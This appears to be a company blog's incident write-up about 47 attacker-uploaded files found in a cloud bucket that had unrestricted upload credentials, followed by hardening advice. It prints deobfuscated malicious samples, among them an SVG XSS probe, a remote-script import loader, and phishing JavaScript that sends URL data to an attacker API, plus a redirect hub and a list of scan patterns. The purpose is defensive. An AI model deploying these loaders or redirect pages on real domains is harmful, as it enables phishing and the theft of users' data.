---
title: "Our Cloud Provider Found 1 Malicious File in Our Bucket — We Found 47"
description: "A security alert on one malicious file led us to scan the whole bucket. We found 47 files spanning 15 months — XSS probes, redirect hubs, obfuscated phishing pages. The cloud provider's scanner caught one."
date: 2026-03-14
draft: false
slug: "cloud-bucket-malicious-upload"
categories:
    - Incidents
tags:
    - Security
    - Cloud Storage
    - Troubleshooting
---

We got a security ticket from our cloud provider: a malicious file was detected in one of our object storage buckets. Please handle it.

It was an HTML file. On the surface, a loading page: blue spinner, text saying "Loading, please wait..." Looked harmless.

It was a phishing page.

After cleaning it up, we decided to scan the entire bucket. We found **47 malicious files, the earliest uploaded 15 months prior**. The cloud provider's scanner had caught exactly one.

---

## What the "Loading" Page Actually Did

This is what the user sees:

```html
<div id="loading">
  <div>
    <div class="spinner"></div>
    <div class="loading-text">Loading, please wait...</div>
  </div>
</div>
```

A standard loading animation. No one would suspect anything.

But the `<script>` tag contained obfuscated JavaScript, processed by a commercial JS obfuscation service. The raw code looked like this (`_0x` variable names, base64-encoded strings, RC4 decryption layers):

```javascript
var _0x1a2b='jsjiami.com.v7';
function _0x3de7(){const _0x2c645c=(function(){return[_0x1a2b,
'EFbjRkusyjTgIiSUFamti.cRhoVAgmeO.EvH7MAg==','jSk2bSogW7/dTCk5WRadca',
// ... hundreds more lines of this
```

After deobfuscating the string array (RC4-encoded, indexed by a lookup function) and tracing the control flow, the core logic roughly translates to:

```javascript
document.addEventListener('DOMContentLoaded', function() {
  // 1. Read the URL query string
  const qs = window.location.search.substring(1);

  // 2. POST query params to an attacker-controlled server
  const formData = new FormData();
  formData.append('data', qs);
  fetch('https://<attacker-api>/...', {
    method: 'POST',
    body: formData
  })
  .then(res => res.json())
  .then(data => {
    // 3. Server returns base64-encoded HTML, replaces the entire page
    document.open();
    document.write(atob(data.content));
    document.close();
  });
});
```

The attack chain:

1. Attacker sends a link to the victim: `https://your-legitimate-domain/path/loading.html?r=xxx&token=yyy`
2. Victim sees "Loading...", looks normal
3. The page POSTs URL parameters to the attacker's server
4. Server returns a base64-encoded page (phishing form, gambling redirect, or anything else the attacker chooses)
5. `document.write` replaces the entire page with attacker-controlled content

The key: **the phishing page runs on your legitimate domain**. The victim sees a trusted domain in the address bar, which lowers their guard.

---

## How We Found the Other 46

The cloud provider's ticket only flagged one file. But if an attacker uploaded one, there were probably more.

We wrote a Python script using the cloud storage SDK to scan every file in the bucket. The approach was simple: list all objects, flag anything with a suspicious extension (`.html`, `.htm`, `.js`, `.php`, `.svg`), then download and inspect the flagged files for malicious patterns like `_0x` variable names, `eval(`, `document.write(atob`, `onload=import(`, and known obfuscation service markers.

The scan finished in a few minutes. It found 75 files with suspicious extensions. We expected some false positives (user agreements, terms of service pages), so we ran a second pass: download each file, classify by content, separate legitimate business files from actual threats.

The result: 47 malicious files, 2 legitimate business pages, and the rest were misnamed images (PNG files with `.html` extensions, harmless but telling of the upload validation gap).

The earliest file was from November 2024. The most recent was from a few days ago. Fifteen months of ongoing operation.

---

## The Full Picture: 47 Files, 5 Generations

Sorting by upload date showed the attacker's development process: five generations, each more sophisticated than the last. Like reading commit history.

### Generation 1: XSS Probe

```html
<svg onload=alert(0)>
```

One line. The attacker was testing whether the bucket serves HTML files that execute JavaScript in the browser. The answer was yes — SVG script execution confirmed. The bucket served files without a `Content-Disposition: attachment` header, so the browser rendered them directly. This probe confirmed the bucket was a viable delivery platform; Generation 2 would test HTML specifically.

### Generation 2: Remote Script Loaders (20 files)

```html
<body onload=import("//<attacker-cdn>/payload.js")>
```

Also one line. Using `import()` to dynamically load a remote JS module. Each file was only 71 bytes. (This requires the attacker-controlled CDN to serve the file with permissive CORS headers — a setup cost, but not a meaningful barrier.) The attacker uploaded 20 copies in quick succession with incrementing filenames (`tmp_xxx0.html`, `tmp_xxx1.html`...), likely batch testing or A/B experimentation.

### Generation 3: Nested HTML Pages (10 files)

1.6KB each, containing nested `<html>` tags with `lang="zh-cn"`. More structured than the one-liners, but still from the same upload path prefix. The attacker was building up complexity.

### Generation 4: Traffic Redirect Hub (5 files)

```html
<title>Official Verification</title>
```

These looked like phishing pages at first glance. 178KB each, with a title claiming "Official Verification." But the actual code told a different story.

Buried under a full copy of jQuery 3.6.4 (to look legitimate and inflate the file size), the real logic was just a few lines:

```javascript
$(function() {
    let data = decodeURIComponent(window.location.search.substr(1));
    let apiEndpoint = 'https://<attacker-api>/rpa.php';
    data = data.split('data=')[1]
    $.get(apiEndpoint, { data: data }, function(data) {
        iframe(data.data)
    });
});

function iframe(src) {
    const isWeChat = /MicroMessenger/i.test(navigator.userAgent);
    const isQQ = /QQ/i.test(navigator.userAgent);

    if(!isWeChat && !isQQ){
        top.location.href = src;  // Regular browser: full redirect
        return;
    }
    // WeChat/QQ: embed in iframe to bypass external link warnings
    $("#iframe").html('<iframe src="' + src + '" ...></iframe>');
}
```

This is not a phishing page. It is a **traffic redirect hub**. The attacker's backend (`rpa.php`) dynamically decides where to send the visitor. The page itself is just a relay. The actual destination could be anything: gambling, fraud, pornography, phishing, app downloads. The attacker controls it server-side and can change it at any time.

The WeChat/QQ user agent detection is telling. These pages were designed to spread through Chinese social messaging apps. In a regular browser, the page does a full redirect. In WeChat or QQ, it loads the target in an iframe instead, because these apps intercept top-level navigations for content filtering, while iframes bypass those hooks.

The page also blocks F12 with a fake alert: "Thank you for using the management platform. Console operations are prohibited." A small touch to discourage curious users from inspecting the source.

All 5 files were nearly identical, uploaded within a 3-minute window on the same day. The attacker was debugging the redirect flow.

When the cloud provider eventually flagged one of these files months later, they classified it as "pornographic content." They were not wrong, exactly. At the time they scanned it, the backend happened to be redirecting to pornographic sites. But they missed the bigger picture: this was a general-purpose traffic distribution platform, not a static porn page. The redirect target could change hourly.

### Generation 5: Obfuscated Phishing Pages (5 files)

The final form. The loading page described at the top of this article: full loading animation, commercial-grade JS obfuscation, remote content injection, dynamic page replacement. Two of the five used `jsjiami.com` v7 obfuscation; the other three used a different `_0x`-style obfuscation. The most recent one was uploaded days before the cloud provider's alert.

### Also Found: A CDN API Proxy (1 file)

```html
<!-- Upload this file to CDN, can be used as an API endpoint -->
```

The attacker left a comment explaining their intent. An HTML file hosted on a CDN becomes an API relay when its JavaScript reads query parameters and forwards them to an attacker-controlled endpoint — requests then appear to originate from your domain, bypassing IP blocks or origin restrictions on the attacker's real infrastructure.

### Remaining Files (5 files)

Two files disguised as PNGs (binary image data with `.html` extension) used for probing, and three empty or near-empty test files. Attacker leftovers from the experimentation phase.

---

## How the Attacker Got Upload Access

Our bucket was private-write, public-read. Users cannot upload directly to the bucket. The upload flow was standard:

```
Frontend → requests upload credential from backend API
Backend  → generates temporary credential (STS token or pre-signed URL)
Frontend → uploads directly to object storage using the credential
```

This is the textbook pattern recommended by every cloud provider. The architecture was fine.

The problem: **the credentials had no restrictions**.

- No Content-Type constraint. Any file type could be uploaded.
- No file extension validation. `.html`, `.js`, `.php` all accepted.
- No path restriction. The attacker could set any object key.
- Credential TTL was in hours. Plenty of time.

All the attacker needed to do:

1. Get an account (or obtain any existing user's session)
2. Call the upload API to get a credential
3. Upload an `.html` file using that credential
4. Construct the public URL and start distributing

No exploit needed. No vulnerability in the traditional sense. Just "legitimate" use of an overly permissive API.

---

## Why It Went Undetected for 15 Months

No monitoring.

- No alerting on uploaded file types
- No detection for unusual extensions
- No periodic scan of existing files
- Access logs were enabled, but nobody looked at them

And the cloud provider's scanner? 47 malicious files over 15 months, and it caught 1. This is not surprising. Cloud-side security scanning operates at massive scale with conservative rules, primarily relying on signature matching. Obfuscated code, one-line `import()` loaders, and base64 dynamic injection are designed to evade exactly this kind of detection.

Your bucket, your responsibility. Cloud provider scanning is a backstop, not a defense.

---

## The Fix

Lock Content-Type at credential generation. For pre-signed URLs: include `Content-Type` as a signed header — a mismatch causes signature verification to fail before the file is accepted. For STS temporary credentials: add a Content-Type condition to the session policy. Both enforce the restriction at the infrastructure level, with no application code needed. Consult your provider's IAM/CAM policy docs for the exact condition key and operator names.

```json
// Illustrative only. Condition key ("content-type" vs "cos:content-type") and
// operator ("string_equal" vs "StringEquals") differ by provider.
// Consult your provider's IAM/CAM policy documentation for exact syntax.
{
  "effect": "allow",
  "action": ["PutObject"],
  "condition": {
    "string_equal": {
      "content-type": ["image/jpeg", "image/png", "image/gif"]
    }
  }
}
```

Server-generated keys: the frontend sends only the file extension (validated server-side), and the backend generates the full object key with a random UUID. The attacker cannot control the path.

Shorter TTL: hours-level down to 10-15 minutes. This limits residual exposure after a session compromise; pair it with server-generated keys to also eliminate path-control abuse.

Response headers: configure the CDN or a cloud function trigger to set `Content-Disposition: attachment` for non-image types — this forces a download regardless of file content. `X-Content-Type-Options: nosniff` is a separate concern: it prevents MIME sniffing for script and style resources, but has no effect on HTML rendering.

Monitor upload extensions: any `.html` or `.js` file appearing in a bucket that should only contain images is a zero-tolerance alert.

---

## Takeaway

1. **"Private write" does not mean secure.** As long as you have an upload API that hands out credentials, and those credentials are unrestricted, attackers can upload anything.

2. **Attackers iterate, and your bucket becomes infrastructure.** We watched an attacker's development lifecycle play out in our bucket. It started with a one-line `<svg onload=alert(0)>` probe to confirm the bucket renders HTML. Then 20 rapid-fire script loaders to test payload delivery. Then nested HTML experiments. Then a traffic redirect hub with WeChat/QQ detection, optimized for distribution through Chinese social messaging apps. Finally, obfuscated loading pages with remote content injection. Once they find a bucket that works, they keep coming back and refining their approach. The 3-minute upload burst on the redirect pages shows them debugging in real-time. It was a sustained operation, and your domain reputation was funding it.

3. **Do not rely on your cloud provider's security scanner.** 47 files, 15 months, 1 detection. When they finally flagged one, they classified it as "pornographic content" because the dynamic redirect happened to be pointing at porn that day. They missed that it was a general-purpose traffic distribution platform. Signature-based scanning cannot keep up with server-controlled dynamic payloads. Run your own scans.

4. **Add Content-Type to your pre-signed URL signature or STS policy condition.** This single change blocks the entire attack vector. If your upload API does not restrict file types today, fix it now — it takes one line in the signing config.
